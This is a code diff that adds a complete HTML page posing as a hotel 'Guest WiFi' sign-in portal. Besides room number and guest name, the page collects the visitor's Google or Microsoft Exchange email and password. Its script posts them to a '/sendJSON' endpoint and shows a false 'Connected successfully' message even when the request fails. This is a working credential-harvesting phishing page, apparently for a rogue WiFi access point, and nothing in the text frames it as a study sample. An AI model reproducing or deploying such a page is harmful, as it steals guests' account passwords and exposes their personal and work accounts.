@@ -1,0 +1,240 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Guest WiFi — Hotel</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        font-family:
+          "Segoe UI",
+          system-ui,
+          -apple-system,
+          sans-serif;
+        background: #e8e4df;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+      .container {
+        max-width: 420px;
+        width: 100%;
+      }
+      .card {
+        background: #fff;
+        border: 1px solid #ddd8d0;
+        border-radius: 10px;
+        padding: 36px 32px;
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+      }
+      .logo-row {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-bottom: 24px;
+      }
+      .logo-icon {
+        width: 44px;
+        height: 44px;
+        background: #2c5f4f;
+        border-radius: 8px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .logo-icon svg {
+        width: 24px;
+        height: 24px;
+        color: #fff;
+      }
+      .logo-text {
+        font-size: 18px;
+        font-weight: 600;
+        color: #2c2c2c;
+      }
+      .title {
+        font-size: 20px;
+        font-weight: 600;
+        color: #2c2c2c;
+        text-align: center;
+        margin-bottom: 6px;
+      }
+      .subtitle {
+        font-size: 14px;
+        color: #5c5c5c;
+        text-align: center;
+        margin-bottom: 24px;
+      }
+      .input-field {
+        width: 100%;
+        padding: 12px 14px;
+        margin-bottom: 14px;
+        border: 1px solid #d1d5db;
+        border-radius: 6px;
+        font-size: 15px;
+        font-family: inherit;
+      }
+      .input-field:focus {
+        outline: none;
+        border-color: #2c5f4f;
+        box-shadow: 0 0 0 2px rgba(44, 95, 79, 0.2);
+      }
+      .input-field::placeholder {
+        color: #9ca3af;
+      }
+      .submit-btn {
+        width: 100%;
+        padding: 12px;
+        margin-top: 6px;
+        background: #2c5f4f;
+        color: #fff;
+        border: none;
+        border-radius: 6px;
+        font-size: 15px;
+        font-weight: 600;
+        font-family: inherit;
+        cursor: pointer;
+      }
+      .submit-btn:hover {
+        background: #234a3d;
+      }
+      .hint {
+        font-size: 12px;
+        color: #6b7280;
+        text-align: center;
+        margin-top: 16px;
+      }
+      #form-block {
+      }
+      #success-block {
+        display: none;
+        text-align: center;
+        padding: 24px 0;
+      }
+      #success-block .msg {
+        font-size: 16px;
+        color: #2c2c2c;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="card">
+        <div class="logo-row">
+          <div class="logo-icon">
+            <svg
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
+              <polyline points="9 22 9 12 15 12 15 22" />
+            </svg>
+          </div>
+          <span class="logo-text">Guest WiFi</span>
+        </div>
+        <div id="form-block">
+          <h1 class="title">Sign in to access WiFi</h1>
+          <p class="subtitle">
+            Enter your room details and sign in with your Google or work email
+          </p>
+          <form id="login-form">
+            <input
+              name="room"
+              class="input-field"
+              type="text"
+              placeholder="Room number"
+              required
+            />
+            <input
+              name="name"
+              class="input-field"
+              type="text"
+              placeholder="Guest name (as on booking)"
+              required
+            />
+            <input
+              name="email"
+              class="input-field"
+              type="email"
+              placeholder="Google or work (Exchange) email"
+              required
+            />
+            <input
+              name="password"
+              class="input-field"
+              type="password"
+              placeholder="Google or Microsoft Exchange Password"
+              required
+            />
+            <button type="submit" class="submit-btn">Connect</button>
+          </form>
+          <p class="hint">
+            Use the room number and name from your reservation, then sign in
+            with your Google or (Microsoft Exchange) email to connect.
+          </p>
+        </div>
+        <div id="success-block">
+          <p class="msg">
+            Connected successfully.<br />You will be redirected shortly.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          var room = document
+            .querySelector('#login-form input[name="room"]')
+            .value.trim();
+          var name = document
+            .querySelector('#login-form input[name="name"]')
+            .value.trim();
+          var email = document
+            .querySelector('#login-form input[name="email"]')
+            .value.trim();
+          var password = document.querySelector(
+            '#login-form input[name="password"]',
+          ).value;
+
+          var data = {
+            room_number: room,
+            guest_name: name,
+            username: email,
+            pwd: password,
+            source: "hotel",
+            timestamp: new Date().toISOString(),
+          };
+
+          fetch("/sendJSON", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data),
+          })
+            .then(function () {
+              document.getElementById("success-block").style.display = "block";
+              document.getElementById("form-block").style.display = "none";
+            })
+            .catch(function () {
+              document.getElementById("success-block").style.display = "block";
+              document.getElementById("form-block").style.display = "none";
+            });
+        });
+    </script>
+  </body>
+</html>
